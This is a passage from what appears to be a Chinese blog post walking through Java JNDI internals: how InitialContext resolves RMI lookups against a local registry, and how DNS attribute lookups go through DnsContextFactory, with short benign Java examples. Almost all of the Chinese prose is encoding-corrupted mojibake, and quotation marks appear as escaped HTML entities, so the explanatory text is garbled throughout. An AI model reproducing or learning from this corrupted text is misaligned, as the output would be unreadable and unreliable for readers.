æ‰€ä»¥ä¼šè¿”å›nullï¼Œç„¶åå°±ä¼šè¿›å…¥åé¢çš„ifæ¡ä»¶ï¼š\næ‰€ä»¥å¾ˆæ­£å¸¸è¿™é‡Œä¼šè·å–åˆ°envå˜é‡ï¼ˆHashtableç±»ï¼‰çš„INITIAL_CONTEXT_FACTORYï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯å‰é¢çš„RegistryContextFactoryç±»ï¼Œæ‰€ä»¥åé¢å°±ä¸ä¼šè¿›å…¥ifæ¡ä»¶ã€‚\nç»§ç»­å¾€åçœ‹ï¼š\næ‰€ä»¥è¿™é‡Œåº”è¯¥å°±æ˜¯ä¼šåŠ è½½è¿™ä¸ªç±»ä¸ºClasså¯¹è±¡ï¼Œç„¶åå¯¹è¿™ä¸ªClasså¯¹è±¡è°ƒç”¨newInstance()æ–¹æ³•å°†å…¶å®ä¾‹åŒ–ã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¼šè·å–åˆ°RegistryContextFactoryç±»å®ä¾‹ï¼š\nå¹¶å°†è¿™ä¸ªå®ä¾‹åŒ–ç±»èµ‹å€¼ç»™äº†factoryå˜é‡ï¼Œå†å¾€åçœ‹ï¼Œå°±ä¼šåˆ°å¦‚ä¸‹ä»£ç ï¼š æ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨RegistryContextFactoryç±»çš„getInitialContext()æ–¹æ³•ï¼Œå¹¶ä¼ å…¥äº†envå˜é‡ï¼ˆå°±æ˜¯Hashtableç±»ï¼‰ï¼Œè·Ÿè¿›getInitialContext()æ–¹æ³•ï¼š\nç°åœ¨åˆå¯¹è¿™ä¸ªHashatbleç±»è°ƒç”¨äº†clone()æ–¹æ³•ï¼Œâ€œå…‹éš†â€ä¸€æ¬¡ï¼Ÿå…ˆå°†å…¶ç†è§£ä¸ºå°±æ˜¯å‰é¢ä¼ å…¥çš„Hashtableç±»ã€‚ç„¶åèšç„¦äºreturnè°ƒç”¨çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«è·Ÿè¿›ä¸€ä¸‹ï¼š\ngetInitCtxURL(var1)ï¼š è¿™é‡Œå®¹æ˜“çœ‹å‡ºä¼šè¿›å…¥ifæ¡ä»¶ï¼Œç„¶åå¯¹è¿™ä¸ªHashtableç±»è°ƒç”¨äº†å–å€¼çš„æ“ä½œï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯å‰é¢æ”¾è¿›çš„å€¼ï¼Œæ‰€ä»¥ä¼šå°†var2å˜é‡èµ‹å€¼ä¸º\u0026quot;rmi://localhost:1099\u0026quot;ï¼Œæ‰€ä»¥æœ€ç»ˆè¿™ä¸ªgetInitCtxURL()æ–¹æ³•å°±æ˜¯è¿”å›äº†è¿™ä¸ªvar2ï¼Œå³\u0026quot;rmi://localhost:1099\u0026quot;ï¼Œä¹Ÿå°±æ˜¯è·å–â€œç¯å¢ƒå˜é‡â€æŒ‡å®šçš„æœåŠ¡åœ°å€ã€‚\nURLToContext()æ–¹æ³•ï¼š ä»£ç å¦‚ä¸Šï¼Œç®€å•è¯´æ˜ä¸€ä¸‹å‚æ•°é—®é¢˜ï¼šï¼ˆvar0 ==ã€‹ rmi://localhost:1099 ï¼› var1 ==ã€‹ Hashtableç±»ï¼‰ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åˆå®ä¾‹åŒ–äº†ä¸€ä¸ªrmiURLContextFactoryç±»ï¼Œç„¶åè°ƒç”¨äº†è¿™ä¸ªç±»çš„getObjectInstance()æ–¹æ³•ï¼ˆä¼ å…¥äº†var0å’Œvar1ï¼‰ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š\nå¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œä¼šè¿›å…¥åˆ°ç¬¬ä¸€ä¸ªelse ifè¯­å¥ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨getUsingURL()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼š å–”ï¼Œç®€å•çŸä¸€çœ¼ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªè€æœ‹å‹ï¼Œlookup()æ–¹æ³•ï¼Œæœ‰ç‚¹æ„æ€ã€‚ç°åœ¨æ¥è·Ÿä¸€ä¸‹è¿™é‡Œçš„æ–¹æ³•æºç ï¼š\nè¿™é‡Œå…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªrmiURLContextç±»ï¼Œå¹¶ä¼ å…¥äº†var1ï¼ˆHashtableç±»ï¼‰ï¼Œç®€å•è·Ÿä¸€ä¸‹è¿™é‡Œçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š\nå…ˆè·Ÿè¿›rmiURLContextç±»çš„çˆ¶ç±»GenericURLContextç±»çš„æ„é€ æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œå°±æ˜¯å°†GenericURLContextç±»çš„myEnvå˜é‡èµ‹å€¼ä¸ºHashtableç±»ï¼š å›åˆ°rmiURLContextFactoryç±»çš„getUsingURL()æ–¹æ³•ï¼š æ¥çœ‹çœ‹è¿™é‡Œçš„lookup()æ–¹æ³•ä¼šå¹²å˜›ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨rmiURLContextç±»çš„lookup()æ–¹æ³•ï¼Œä½†æ˜¯rmiURLContextç±»æ²¡æœ‰lookup()æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°çˆ¶ç±»GenericURLContextç±»çš„lookup()æ–¹æ³•ï¼ˆä¼ å…¥äº†var0ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºçš„å˜é‡ï¼‰ï¼š\nè·Ÿè¿›è¿™é‡Œçš„getRootURLContext()æ–¹æ³•ï¼Œä¼ å…¥äº†var1å‚æ•°å’Œåˆšå¥½åœ¨å‰é¢åˆå§‹åŒ–ç±»æ—¶èµ‹å€¼çš„å˜é‡myEnvï¼ˆä¹Ÿå°±æ˜¯Hashtableç±»ï¼‰ï¼Œç®€å•è·Ÿè·Ÿï¼Œè¯´å‡ ä¸ªé‡ç‚¹ï¼Œæ–¹æ³•ç»“æœå¦‚ä¸‹ï¼š\nè¿™é‡Œå¯ä»¥çœ‹åˆ°å®ä¾‹åŒ–äº†ä¸¤ä¸ªç±»ï¼Œå¯¹åº”ä»£ç å¦‚ä¸‹ï¼š å‰é¢çš„CompositeNameç±»çš„åˆå§‹åŒ–å°±ä¸å¤šè¯´äº†ï¼Œé‡ç‚¹çœ‹RegistryContextç±»çš„åˆå§‹åŒ–ï¼š\nå°±æ˜¯å°†è¿™é‡Œçš„environmentå˜é‡èµ‹å€¼ä¸ºäº†Hashtableç±»å®ä¾‹ï¼Œç„¶åå°†è¿™é‡Œçš„registryã€hostã€portå˜é‡åˆ†åˆ«èµ‹å€¼ï¼Œç®€å•è·Ÿä¸€ä¸‹è¿™é‡Œçš„getRegistry()æ–¹æ³•ï¼š\nå¦‚ä¸‹ï¼š\nç„¶ååˆä¼šè°ƒç”¨LocateRegistryç±»çš„getRegistry()æ–¹æ³•ï¼š è°ƒç”¨å¦ä¸€ä¸ªé‡è½½çš„getRegistry()æ–¹æ³•ï¼Œåœ¨æ–¹æ³•æœ€åè§åˆ°äº†è€æœ‹å‹ï¼š\nåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä¼šåˆ›å»ºRegistryImpl_Stubç±»ï¼š æœ€åä¹Ÿå°±ä¼šè¿”å›è¿™ä¸ªRegistryImpl_Stubç±»ã€‚ï¼ˆåé¢å†ç¢°åˆ°çš„getRootURLContext()æ–¹æ³•éƒ½æ˜¯å·®ä¸å¤šçš„ï¼‰\nå›åˆ°RegistryContextç±»çš„æ„é€ æ–¹æ³•ç„¶åhostå’Œportçš„èµ‹å€¼ï¼š æœ€ååœ¨rmiURLContextç±»çš„getRootURLContext()æ–¹æ³•å°†CompositeNameç±»å’ŒRegistryContextå°è£…è¿›äº†ResolveResultç±»å¹¶è¿”å›äº†å®ƒã€‚\nâ€”â€”â€”â€”â€”â€”\nå›åˆ°lookup()æ–¹æ³•ï¼Œç„¶ååé¢è°ƒç”¨çš„ä¸¤ä¸ªæ–¹æ³•ï¼šgetResolvedObj()å’ŒgetRemainingName()æ–¹æ³•ï¼Œéƒ½æ˜¯è·å–å˜é‡å€¼çš„æ“ä½œï¼Œå¯¹åº”ä¸Šé¢ç»“æœä¸­çš„ResolveResultç±»ä¸­çš„ä¸¤ä¸ªå˜é‡ã€‚\næ‰€ä»¥åé¢çš„var3å˜é‡çš„å€¼ä¸ºRegistryContextç±»å®ä¾‹ï¼š\nè¿™å‡ ä¸ªå˜é‡çš„å€¼è¿˜æ˜¯æŒºé‡è¦çš„ã€‚\nâ€”â€”â€”â€”â€”â€”\nåé¢åˆä¼šè°ƒç”¨RegistryContextç±»çš„lookup()æ–¹æ³•ï¼š\nè¿™é‡Œçš„var2.getRemainingNameä¼šè¿”å›å‰é¢è¯´è¿‡çš„å˜é‡ï¼Œå€¼ä¸ºï¼š\nä¹Ÿè¿˜æ˜¯å¯¹åº”å‰é¢çš„var2ä¸­çš„å˜é‡ã€‚\nç»§ç»­è·Ÿè¿›RegistryContextç±»çš„lookup()æ–¹æ³•ï¼Œä¼ å…¥äº†CompositeNameç±»å®ä¾‹ï¼š\nç„¶åè¿™é‡Œä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªRegistryContextç±»å¹¶è¿”å›å®ƒï¼Œåœ¨å®ä¾‹åŒ–æ—¶ä¼šè¿›è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼š\næœ€åè¿”å›äº†è¿™ä¸ªRegistryContextç±»ï¼Œè¿™ä¸ªç±»è¿˜æ˜¯åŒ…å«äº†ä¸€ä¸‹é‡è¦ä¿¡æ¯ã€‚\nç„¶åç®€å•è·Ÿäº†ä¸€ä¸‹returnçš„éƒ¨åˆ†ï¼Œæœ€åå°±æ˜¯å°†InitialContextç±»çš„defaultInitCtxå˜é‡èµ‹å€¼ä¸ºäº†è¿™åˆšRegistyContextç±»ã€‚\nå‘½åæœåŠ¡è·å–å¯¹è±¡ å¯¹åº”ä»£ç ï¼š\n1 RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); å‰é¢è·å–åˆ°äº†InitialContextç±»å¹¶è¿›è¡Œäº†ä¸€äº›é‡è¦çš„èµ‹å€¼æ“ä½œï¼Œç±»å˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\næ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨InitialContextç±»çš„lookup()æ–¹æ³•ï¼š\nå…ˆè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„getURLOrDefaultInitCtx()æ–¹æ³•ï¼š\nç¬¬ä¸€ä¸ªifæ¡ä»¶ä¸ä¼šè¿›å…¥ï¼Œè·Ÿä¸€ä¸‹è¿˜æ˜¯å¾ˆå¥½çœ‹å‡ºçš„ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚\nåé¢çš„schemaçš„å€¼ä¸ºnullï¼Œè°ƒç”¨çš„getURLSchema()æ–¹æ³•ä¹Ÿæ˜¯å®¹æ˜“çœ‹çš„ã€‚\næ‰€ä»¥æœ€åä¼šè°ƒç”¨getDefaultInitCtx()æ–¹æ³•ï¼Œåˆæ˜¯è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œå´ç›´æ¥è¿”å›å€¼ï¼Œå¦‚ä¸‹ï¼š\nç”±äºå‰é¢åˆå§‹åŒ–æ—¶ä¼šå°†è¿™é‡Œçš„gotDefaultå˜é‡è®¾ç½®ä¸ºtrueï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥è¿”å›å®šä¹‰çš„defaultInitCtxå˜é‡ï¼Œå³å‰é¢çš„RegistryContextç±»å®ä¾‹ã€‚\nå³getURLOrDefaultInitCtx(name)çš„è°ƒç”¨å°±æ˜¯è·å–RegistryContextç±»å®ä¾‹ã€‚\nâ€”â€”â€”\nå›åˆ°InitialContextç±»çš„lookup()æ–¹æ³•ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨RegistryContextç±»çš„lookup()æ–¹æ³•ï¼Œå¹¶ä¼ å…¥äº†Helloè¿™ä¸ªå‚æ•°å˜é‡ï¼š\nä¸¤ä¸ªç‚¹ï¼Œéƒ½è·Ÿä¸€ä¸‹ï¼š\nCompositeNameç±»çš„åˆå§‹åŒ–ï¼š ä¹Ÿå°±æ˜¯ç»™CompositeNameç±»çš„implå˜é‡èµ‹å€¼ã€‚\nè°ƒç”¨äº†RegistryContextç±»çš„å¦ä¸€ä¸ªlookup()æ–¹æ³•ï¼Œå¹¶å°†å‰é¢çš„CompositeNameç±»ä¼ äº†è¿›å»ï¼š è¿™é‡Œåˆè°ƒç”¨äº†è¿™ä¸ªlookup()æ–¹æ³•ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ï¼Œå°±æ˜¯è¿™é‡Œçš„var1æœ‰å€¼ã€‚å°±ç®€å•ç†è§£ä¸ºå°†ä¸€ä¸ªå­—ç¬¦ä¸²åè½¬æ¢æˆå¯¹åº”çš„Nameç±»å‹å¯¹è±¡ã€‚æ‰€ä»¥ç°åœ¨ä¼šè¿›å…¥elseè¯­å¥ï¼š ç„¶åå°±ä¼šè°ƒç”¨RegistryImpl_Stubç±»çš„lookup()æ–¹æ³•ï¼Œç”¨æ¥æŸ¥æ‰¾RMIæœåŠ¡ï¼š\nä¹Ÿå°±æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„æ“ä½œäº†ï¼š\næœ€åè¿™é‡Œååºåˆ—åŒ–è·å–ä»£ç†å¯¹è±¡ã€‚\nä¹Ÿå°±æ˜¯é‚£ä¸ªä»£ç†å¯¹è±¡ï¼š åç»­ä»£ç çš„æ–¹æ³•è°ƒç”¨å°±å’ŒRMIçš„å·®ä¸å¤šäº†ã€‚\næœ€ç»ˆæˆåŠŸè¾¾åˆ°è®¿é—®ä¸€æ¬¡RMIæœåŠ¡çš„æ“ä½œã€‚\nè¡¥å……è¯´æ˜ åŠ¨æ€åè®®åˆ‡æ¢ åœ¨å‰é¢çš„åè®®è½¬æ¢ä¸­ï¼Œæåˆ°äº†ä¸€ä¸ªä¸éœ€æŒ‡å®šç¯å¢ƒå˜é‡ï¼Œå¯ä»¥é€šè¿‡æœåŠ¡åœ°å€ç›´æ¥è·å–åˆ°ç›¸åº”å¯¹è±¡ï¼Œå®Œæ•´å®ç°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package JNDI; import Rmi.Server.RemoteInterface; import javax.naming.InitialContext; public class JNDI_Main { public static void main(String[] args) throws Exception { // åˆ›å»ºJNDIç›®å½•æœåŠ¡ä¸Šä¸‹æ–‡ InitialContext context = new InitialContext(); // æŸ¥æ‰¾JNDIç›®å½•æœåŠ¡ç»‘å®šçš„å¯¹è±¡ RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); System.out.println(o.sayHello()); } } ï¼ˆæ³¨æ„èµ·RMI ServeræœåŠ¡ï¼‰\nè¿™æ ·ä¹Ÿèƒ½å®ç°ä¸€æ¬¡è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚\nç°åœ¨æ¥åˆ†æä¸€ä¸‹è¿‡ç¨‹ï¼Œä¸€æ­¥ä¸€æ­¥æ¥ï¼š\nå‘½åæœåŠ¡åˆå§‹åŒ– å¯¹åº”ä»£ç ï¼š\n1 InitialContext context = new InitialContext(); è¿™é‡Œçš„è¿‡ç¨‹å…¶å®éƒ½å’Œå‰é¢å°†è¦æ±‚çš„å€¼æ”¾å…¥å¦‚ç¯å¢ƒå±æ€§ä¸­å·®ä¸å¤šçš„ï¼Œåˆšå¥½å‰é¢åªæ˜¯ç•¥è¿‡ï¼Œè¿™é‡Œç¨å¾®è¯¦ç»†è®²è®²ï¼š\nè°ƒç”¨çš„æ„é€ æ–¹æ³•ï¼š\nè°ƒç”¨Init()æ–¹æ³•ï¼š è·Ÿè¿›ResourceManagerç±»çš„getInitialEnvironment()æ–¹æ³•ï¼š\nå‰é¢å®ä¾‹åŒ–äº†ä¸€ä¸ªHashtableç±»ï¼Œåé¢çš„getJndiProperty()æ–¹æ³•ä¸­æœ‰è¯»å–ç¯å¢ƒå±æ€§çš„ä»£ç ï¼Œå¦‚æœè¯»å–åˆ°äº†å°±ä¼šæ”¾è¿›Hashtableç±»ä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰å¾€ç¯å¢ƒå±æ€§ä¸­æ”¾ä¸œè¥¿ï¼Œæ‰€ä»¥æœ€ç»ˆè¿”å›çš„è¿™ä¸ªHashtableç±»æ˜¯ç©ºçš„ï¼š\næ‰€ä»¥åç»­çš„è°ƒç”¨get()æ–¹æ³•æ˜¯æ— æ³•è·å–å€¼çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥ç»“æŸåˆå§‹åŒ–äº†ï¼š\nå‘½åæœåŠ¡è·å–å¯¹è±¡ å¯¹åº”ä»£ç ï¼š\n1 RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); ä¼šè°ƒç”¨InitialContextç±»çš„lookup()æ–¹æ³•ï¼š è¿˜æ˜¯åˆ†åˆ«è·Ÿä¸€ä¸‹ï¼š\nåˆæ˜¯getURLOrDefaultInitCtx()æ–¹æ³•ï¼š ä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸åŒåœ°æ–¹äº†ï¼Œè¿™é‡Œè·Ÿè¿›getURLSchema()æ–¹æ³•ï¼š\næ— ç–‘è¿™é‡Œä¼šåŒ¹é…åˆ°:å’Œ/ç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè¿›å…¥ifæ¡ä»¶è¯­å¥è€Œä¸æ˜¯ç›´æ¥è¿”å›nullã€‚\nåœ¨ifè¯­å¥ä¸­ï¼Œè¿›è¡Œäº†å­—ç¬¦ä¸²çš„æˆªå–å·¥ä½œï¼Œæ‰€ä»¥ä¼šè¿”å›rmiè¿™ä¸ªå­—ç¬¦ä¸²ã€‚\nç»§ç»­å¾€åçœ‹ï¼š\nç„¶åå°±ä¼šè¿›å…¥è¿™ä¸ªifè¯­å¥ï¼Œä¼šè°ƒç”¨NamingManage.getURLContext()æ–¹æ³•ï¼ˆè¿™é‡Œä¼ å…¥äº†rmiå­—ç¬¦ä¸²å’Œä¸€ä¸ªç©ºçš„Hashtableç±»ï¼‰ï¼š\nç„¶åè°ƒç”¨äº†getURLObject()æ–¹æ³•ï¼š å–”ï¼ŒgetFactory()æ–¹æ³•ï¼Œæ„Ÿè§‰å¾ˆåƒè·å–å·¥å‚ç±»çš„æ–¹æ³•ï¼Œæœ‰æå¤´ï¼Œæ­¤æ—¶çš„å‚æ•°æƒ…å†µï¼š\nè¿™å°±å·²ç»çœ‹åˆ°äº†åŒ…å«æœ‰rmiURLContextFactoryçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿæ˜¯å‚æ•°ä¼ é€’æ—¶ç¡®å®åº”è¯¥å½¢æˆçš„ï¼Œè·Ÿè¿›ResourceManagerç±»çš„getFactory()æ–¹æ³•ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nparser.nextTokenæ–¹æ³•è¿”å›com.sun.jndi.urlå­—ç¬¦ä¸²ï¼ŒclassSuffixå°±æ˜¯ä¼ å…¥çš„.rmi.rmiURLContextFactoryï¼Œæ‰€ä»¥classNameå˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\næ‰€ä»¥è¿™é‡Œæ‰¾åˆ°äº†å·¥å‚ç±»å¹¶å®ä¾‹åŒ–ï¼Œæœ€åè¿˜è¿”å›äº†è¿™ä¸ªå¯¹è±¡ã€‚\næ‰€ä»¥è¿™é‡Œçš„getFactory()æ–¹æ³•å°±æ˜¯è·å–å·¥å‚ç±»å¯¹è±¡ã€‚\nâ€”â€”â€”â€”\nå›åˆ°NamingManagerç±»çš„getURLObject()æ–¹æ³•ï¼š\næ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨å·¥å‚ç±»rmiURLContextFactoryç±»çš„getObjectInstance()æ–¹æ³•ï¼Œè¿™é‡Œçš„å‚æ•°åˆ†åˆ«ä¸ºï¼šï¼ˆnullã€nullã€nullã€ç©ºçš„Hashtableç±»ï¼‰ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\næ‰€ä»¥å°±æ˜¯å®ä¾‹åŒ–ä¸€ä¸ªrmiURLContextç±»ï¼Œä¼ å…¥äº†ä¸€ä¸ªç©ºçš„Hashtableç±»ï¼Œå°†å…¶çˆ¶ç±»çš„çˆ¶ç±»GenericURLContextçš„myEnvå˜é‡èµ‹å€¼ä¸ºäº†Hashtableç±»ã€‚\næ‰€ä»¥ä¹‹ç±»çš„getURLObject()æ–¹æ³•å°±æ˜¯è·å–åˆ°ä¸€ä¸ªrmiURLContextç±»ã€‚\nâ€”â€”â€”â€”\nå›åˆ°NamingManagerç±»çš„getURLContextç±»ï¼š\næ¯«æ— ç–‘é—®è¿™é‡Œç¬¦åˆç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œæ‰€ä»¥ä¼šè¿”å›è¿™ä¸ªrmiURLContextç±»\nâ€”â€”â€”â€”\nå›åˆ°InitialContextç±»çš„getURLOrDefaultInitCtx()æ–¹æ³•ï¼š\nç¬¦åˆæ¡ä»¶ï¼Œç›´æ¥è¿”å›è¿™ä¸ªrmiURLContextç±»ï¼Œä¸ä¼šåƒä¹‹å‰ä¸€æ ·è°ƒç”¨getDefaultInitCtx()æ–¹æ³•ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œè¿™é‡Œçš„getURLOrDefaultInitCtx(name)æ–¹æ³•å°±æ˜¯ä¼šå¾—åˆ°ä¸€ä¸ªrmiURLContextç±»ï¼Œä½†æ˜¯é‡Œé¢çš„Hashtableç±»ä¸ºç©ºã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nlookup(name)ï¼š è·Ÿè¿›rmiURLContextç±»çš„lookup()æ–¹æ³•ï¼ˆå®é™…è°ƒç”¨çš„æ˜¯å…¶çˆ¶ç±»GenericURLContextçš„lookup()æ–¹æ³•ï¼‰ï¼š å‰é¢ä¹Ÿé‡åˆ°è¿‡è¿™ä¸ªæ–¹æ³•ï¼Œå’Œå‰é¢å·®ä¸å¤šäº†ï¼Œvar2ä¸ºResolveResultç±»å¯¹è±¡ï¼ŒåŒ…å«çš„ä¸¤ä¸ªå˜é‡ï¼ˆå˜é‡å€¼æœ‰ç‚¹ä¸åŒï¼‰ï¼š\nåç»­çš„ä¸¤ä¸ªgetteréƒ½æ˜¯è·å–è¿™é‡Œä¸¤ä¸ªå€¼ï¼Œä¸¤ä¸ªå€¼çš„æƒ…å†µï¼š\nè°ƒç”¨äº†RegistryContextç±»çš„lookup()æ–¹æ³•ï¼š\nè·Ÿè¿›lookup()æ–¹æ³•ï¼š\næ‰€ä»¥ä¼šè¿›å…¥elseè¯­å¥ï¼Œç„¶åå°±ä¼šè°ƒç”¨RegistryImpl_Stubç±»çš„lookup()æ–¹æ³•æŸ¥æ‰¾â€œHelloâ€çš„æœåŠ¡ï¼š\nåŒæ ·ç¬¦åˆRMIçš„è¿‡ç¨‹ã€‚\nJNDI-DNSæœåŠ¡ JNDIæ”¯æŒè®¿é—®DNSæœåŠ¡ï¼Œæ³¨å†Œç¯å¢ƒå˜é‡æ—¶è®¾ç½®JNDIæœåŠ¡å¤„ç†çš„å·¥å‚ç±»æ˜¯com.sun.jndi.dns.DnsContextFactoryç±»ã€‚\nåŸºæœ¬ä»£ç  DNSæœåŠ¡å°±æ˜¯ä¸ºäº†è§£æåŸŸåï¼Œä»£ç å’Œå‰é¢JNDI-RMIä»£ç å¤§ç›¸å¾„åº­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package JNDI; import java.util.Hashtable; import javax.naming.Context; import javax.naming.directory.InitialDirContext; import javax.naming.directory.DirContext; import javax.naming.directory.Attributes; public class JNDI_Main { public static void main(String[] args) throws Exception { Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.dns.DnsContextFactory\u0026#34;); env.put(Context.PROVIDER_URL,\u0026#34;dns://114.114.114.114\u0026#34;); // åˆ›å»ºJNDIç›®å½•æœåŠ¡å¯¹è±¡ DirContext context = new InitialDirContext(env); // è·å–DNSè§£æè®°å½•æµ‹è¯• Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); System.out.println(attrs1); } } è¿™é‡Œæ˜¯ä»dns://114.114.114.114è¿™ä¸ªdnsæœåŠ¡å™¨ä¸ŠæŸ¥è¯¢www.baidu.comåŸŸåçš„ipåœ°å€ï¼Œè¿™é‡Œç”¨çš„æ˜¯JNDIç›®å½•æœåŠ¡ï¼Œç›®å½•æœåŠ¡å…è®¸ç›®å½•å¯¹è±¡å…·æœ‰å±æ€§ï¼Œé‚£ä¹ˆåŒæ ·ä¹Ÿå¯ä»¥æœ‰å€¼ã€‚\nåŒæ ·çš„ï¼Œè¿˜å¯ä»¥ä¸è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå°†å…¶æ”¾è¿›ç³»ç»Ÿå±æ€§ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import java.util.Hashtable; import javax.naming.Context; import javax.naming.directory.InitialDirContext; import javax.naming.directory.DirContext; import javax.naming.directory.Attributes; public class JNDI_Main { public static void main(String[] args) throws Exception { System.setProperty(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.dns.DnsContextFactory\u0026#34;); System.setProperty(Context.PROVIDER_URL,\u0026#34;dns://114.114.114.114\u0026#34;); // åˆ›å»ºJNDIç›®å½•æœåŠ¡å¯¹è±¡ DirContext context = new InitialDirContext(); // è·å–DNSè§£æè®°å½•æµ‹è¯• Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); System.out.println(attrs1); } } æºç åˆ†æ ç›®å½•æœåŠ¡åˆå§‹åŒ–ä¸Šä¸‹æ–‡ å¯¹åº”ä»£ç ï¼š\n1 DirContext context = new InitialDirContext(env); è·Ÿè¿›åˆå§‹åŒ–è¿‡ç¨‹ï¼š è¿™é‡Œè¿›è¡Œç±»çš„åˆå§‹åŒ–çš„æ˜¯InitialDirContextç±»ï¼Œè€Œå®ƒçš„çˆ¶ç±»æ˜¯InitialContextç±»ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®è¿˜æ˜¯åˆå§‹åŒ–çš„InitialContextç±»ï¼Œå¹¶åŒæ ·ä¼ å…¥äº†Hashtableç±»ï¼Œåªä¸è¿‡é‡Œé¢æ”¾å…¥çš„å€¼æ˜¯ä¸åŒçš„ã€‚\nåé¢çš„å…·ä½“è¿‡ç¨‹è¿˜æ˜¯å’Œå‰é¢å‘½åæœåŠ¡åˆå§‹åŒ–å·®ä¸å¤šçš„ï¼Œå°±ä»ä¸ä¸€æ ·çš„åœ°æ–¹å¼€å§‹çœ‹çœ‹ï¼š\nåœ¨NamingManageç±»çš„getInitialContext()æ–¹æ³•ä¸­ï¼Œæœ€åä¼šè°ƒç”¨DnsContextFactoryç±»çš„getInitialContext()æ–¹æ³•ï¼š\nç„¶åè°ƒç”¨DnsContextFactoryç±»çš„ulToContext()æ–¹æ³•ï¼Œå‚æ•°åˆ†åˆ«ä¸ºdns://114.114.114.114ã€DNSæœåŠ¡çš„Hashtableç±»ï¼š æœ€åä¼šè°ƒç”¨getContext()æ–¹æ³•ï¼Œå‚æ•°åˆ†åˆ«ä¸ºï¼š\nç»§ç»­è·Ÿè¿›ï¼š\næ‰€ä»¥è¿™é‡Œæ˜¯åˆå§‹åŒ–äº†ä¸€ä¸ªDnsContextç±»ï¼Œè¿›è¡Œäº†ä¸€äº›èµ‹å€¼æ“ä½œï¼š æœ€åè¿”å›äº†è¿™ä¸ªDnsContextç±»å®ä¾‹ã€‚\næ‰€ä»¥è¿™é‡Œçš„æ­¥éª¤åŒæ ·æ˜¯å°†InitialDiContextç±»çš„çˆ¶ç±»InitialContextç±»å˜é‡defaultInitCtxå˜é‡èµ‹å€¼ä¸ºDnsContextç±»å®ä¾‹ï¼Œå¹¶å°†gotDefaultå˜é‡èµ‹å€¼ä¸ºtueã€‚\nâ€”â€”â€”â€”â€”â€”\nç›®å½•æœåŠ¡è·å–å±æ€§ å¯¹åº”ä»£ç ï¼š\n1 Attributes attrs1 = context.getAttributes(\u0026#34;baidu.com\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); åœ¨å‰é¢çš„åˆå§‹åŒ–åï¼Œç°åœ¨çš„contextå€¼æ˜¯ä¸€ä¸ªInitialDiContextç±»ï¼Œå˜é‡å®šä¹‰ä¸ºï¼š\næ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨InitialDiContextç±»çš„getAttibutes()æ–¹æ³•ï¼š\nè¿˜æ˜¯ä¸¤ä¸ªç‚¹ï¼Œ\nå…ˆè·Ÿè¿›getURLOrDefaultInitDirCtx(name)ï¼š 